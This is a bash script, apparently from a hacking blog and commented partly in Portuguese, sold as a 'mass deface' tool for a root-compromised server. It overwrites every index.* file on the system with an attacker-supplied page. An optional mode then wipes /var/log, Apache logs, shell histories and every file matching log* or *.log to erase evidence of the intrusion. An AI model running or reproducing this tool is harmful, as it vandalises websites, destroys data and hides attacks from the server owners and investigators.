####################################################################################
#!/bin/bash																	       #
#																			 	   #
# Super Simple Mass Deface Script. 												   #
#																				   #
# VOİXSEC.BLOGSPOT.COM                                                                  #
#                    # 
#                    #
#                                                                                  #
# By VoiX                                                                        #
#                                                                                  #
#                                                                         #
####################################################################################



clear
VER=1.0
HELP="
	Modo de uso:
		$(basename "$0"):
		[-h] --help : Como usar. 
		[-m] --mass : Executa o mass deface.
		[-ml] --masslogs : Executa o mass deface E Apaga os logs.
		[-v] --version : Versao do Script.
	Obs: É preciso ser usuario R00t.
	Exemple: voixsec.blogspot.com ~# ./mass.sh -m
"
waiting()
{
	echo -n "."
	sleep 1
	echo -n ".."
	sleep 1
	echo -n "..."
	sleep 1
	echo -n "...."
	sleep 1
	echo -n "....."
	sleep 1
	echo "......"
	sleep 1
	echo "[+] Finding Sites to own.:" 
	find / -name "index.*" -exec cp $INDEX {} \;
	echo "Web sites in the server: status: HACKED!"
}
waitinglogs()
{
	echo -n "."
	sleep 1
	echo -n ".."
	sleep 1
	echo -n "..."
	sleep 1
	echo -n "...."
	sleep 1
	echo -n "....."
	sleep 1
	echo "......"
	sleep 1
	echo "[+] Procurando Sites to own.:"
	find / -name "index.*" -exec cp $INDEX {} \;
	echo "[+] Serao apagados agora os LOGS!"
	echo "Aguarde"
	sleep 2
	echo "procurando Logs."
	
}

if [ -z "$1" ]
then
	echo "Nao Recebi nenhum parametro."
	echo "Uso : $0 -h"
	exit 1
else 
case "$1" in
-m | --mass)
	echo "MASS DEFACE TOOL v.1.0 by voix."
	echo "Aguarde"
	sleep 2
	echo "Defina o diretorio de sua index:"
	read INDEX
	echo "Caminho: $INDEX"
	echo "[+] Hacking!"
    echo "[+] Aguarde."
	waiting
	echo "[+] End."
	echo "Hacked Kernel:" 
	uname -a
	echo "voixsec.blogspot.vom"	
;;
-ml | --masslogs )
	echo "MASS DEFACE + LOGS ERASE TOOL v.1.0 by n4sss."
	echo "Aguarde"
	sleep 2
	echo "Defina o diretorio de sua index:"
	read INDEX
	echo "Caminho: $INDEX"
	echo "Apos o mass deface, sera apagado os logs, Aguarde o resultado."
	sleep 4
	echo "[+] Hacking!"
    echo "[+] Aguarde."
	waitinglogs
	rm -rf /var/log
	rm -rf /var/adm
	rm -rf /var/apache/log
	rm -rf $HISTFILE
	find / -name .bash_history -exec rm -rf {} \;
	find / -name .bash_logout -exec rm -rf {} \;
	find / -name log* -exec rm -rf {} \;
	find / -name *.log -exec rm -rf {} \;
	echo "[+]FEITO!"
	sleep 2
	echo "Arquivos deletados:
							 .bash_history
							 .bash_logout
							  HISTFILE
							  *.log
							  log.*
"
	echo "Web sites in the server: Status: HACKED!"
	echo "[+]End."
	echo "Hacked Kernel:" 
	uname -a
	echo "voixsec.blogspot.com"
;;
-h | --help )
	echo "$HELP"
	exit 0
;;
-v | --version )
	echo "V-$VER"
	exit 0
;;
*)
	echo "Opcao invalida"
;;

esac	
fi
